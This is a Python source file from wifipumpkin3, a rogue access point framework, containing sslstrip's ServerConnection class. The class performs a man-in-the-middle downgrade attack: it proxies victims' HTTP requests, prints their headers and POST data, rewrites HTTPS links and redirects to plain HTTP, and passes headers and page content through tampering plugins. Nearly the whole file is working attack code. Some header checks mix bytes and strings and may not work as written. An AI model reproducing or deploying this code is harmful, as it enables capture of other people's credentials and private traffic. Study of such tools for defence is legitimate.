# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging, re, string, random, zlib, gzip
from io import StringIO

from twisted.web.http import HTTPClient
from wifipumpkin3.plugins.external.sslstrip.URLMonitor import URLMonitor
from wifipumpkin3.plugins.external.sslstrip.ResponseTampererFactory import (
    ResponseTampererFactory,
)


from wifipumpkin3.plugins.external.sslstrip.PluginsManager import PluginsManager

import gzip, inspect, io


class ServerConnection(HTTPClient):

    """ The server connection is where we do the bulk of the stripping.  Everything that
    comes back is examined.  The headers we dont like are removed, and the links are stripped
    from HTTPS to HTTP.
    """

    urlExpression = re.compile(r"(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)", re.IGNORECASE)
    urlType = re.compile(r"https://", re.IGNORECASE)
    urlExplicitPort = re.compile(r"https://([a-zA-Z0-9.]+):[0-9]+/", re.IGNORECASE)

    def __init__(self, command, uri, postData, headers, client):
        self.command = command
        self.uri = uri
        self.postData = postData
        self.headers = headers
        self.client = client
        self.urlMonitor = URLMonitor.getInstance()
        self.responseTamperer = ResponseTampererFactory.getTampererInstance()
        self.plugins_manager = PluginsManager.getInstance()
        self.isImageRequest = False
        self.isCompressed = False
        self.contentLength = None
        self.shutdownComplete = False
        self.plugins = self.plugins_manager.plugins

    def getLogLevel(self):
        return logging.DEBUG

    def getPostPrefix(self):
        return "POST"

    def getUrl(self):
        return self.uri

    def sendRequest(self):
        print("Sending Request: %s %s" % (self.command, self.uri))
        self.sendCommand(self.command, self.uri)

    def sendHeaders(self):
        for header, value in self.headers.items():
            print("Sending header: %s : %s" % (header, value))
            self.sendHeader(header, value)

        self.endHeaders()

    def sendPostData(self):
        print(
            self.getPostPrefix()
            + " Data ("
            + self.headers["host"]
            + "):\n"
            + str(self.postData)
        )
        self.transport.write(self.postData)

    def connectionMade(self):
        print("HTTP connection made.")
        self.sendRequest()
        self.sendHeaders()

        if self.command == "POST":
            self.sendPostData()

    def handleStatus(self, version, code, message):
        print("Got server response: %s %s %s" % (version, code, message))
        self.client.setResponseCode(int(code), message)

    def handleHeader(self, key, value):
        print("Got server header: %s:%s" % (key, value))

        attr = {"function": inspect.stack()[0][3]}
        self.plugins = self.plugins_manager.plugins
        for name in self.plugins:
            try:
                key, value = self.plugins_manager.hook(
                    name, attr, self.client, key, value
                )
            except NotImplementedError:
                pass

        if key.decode().lower() == "content-encoding":
            if value.decode().find("gzip") != -1:
                self.isCompressed = True

        if key.lower() == "location":
            value = self.replaceSecureLinks(value)
            self.urlMonitor.addRedirection(self.client.uri, value)

        if key.lower() == "content-type":
            if value.find("image") != -1:
                self.isImageRequest = True
                print("Response is image content, not scanning...")

        self.client.setHeader(key, value)

    def handleEndHeaders(self):
        if self.isImageRequest and self.contentLength != None:
            self.client.setHeader("Content-Length", self.contentLength)

        if self.length == 0:
            self.shutdown()

    def handleResponsePart(self, data):
        if self.isImageRequest:
            self.client.write(data)
        else:
            HTTPClient.handleResponsePart(self, data)

    def handleResponseEnd(self):
        if self.isImageRequest:
            self.shutdown()
        else:
            HTTPClient.handleResponseEnd(self)

    def handleResponse(self, data):

        self.content_type = self.client.responseHeaders.getRawHeaders("content-type")

        if self.isCompressed:
            logging.debug("Decompressing content...")
            data = gzip.GzipFile("", "rb", 9, io.BytesIO(data)).read()
            len_data = len(data)

        if self.isCompressed:
            attr = {"function": inspect.stack()[0][3]}
            for name in self.plugins:
                try:
                    data = self.plugins_manager.hook(name, attr, self.client, data)
                    len_data = len(data)
                except NotImplementedError:
                    pass
        # print( "Read from server:\n" + data)

        if self.isCompressed:
            s = io.BytesIO()
            g = gzip.GzipFile(fileobj=s, compresslevel=9, mode="w")
            if hasattr(data, "encode"):
                g.write(data.encode())
            else:
                g.write(data)
            g.close()
            data = s.getvalue()

        if (self.isCompressed) and (self.content_type != None):
            self.client.setHeader("Content-Length", str(len_data).encode())

        try:
            self.client.write(data)
        except Exception:
            pass
        self.shutdown()

    def replaceSecureLinks(self, data):
        iterator = re.finditer(ServerConnection.urlExpression, data)

        for match in iterator:
            url = match.group()

            logging.debug("Found secure reference: " + url)

            url = url.replace("https://", "http://", 1)
            url = url.replace("&amp;", "&")
            self.urlMonitor.addSecureLink(self.client.getClientIP(), url)

        data = re.sub(ServerConnection.urlExplicitPort, r"http://\1/", data)
        return re.sub(ServerConnection.urlType, "http://", data)

    def shutdown(self):
        try:
            if not self.shutdownComplete:
                self.shutdownComplete = True
                self.client.finish()
                self.transport.loseConnection()
        except Exception:
            pass
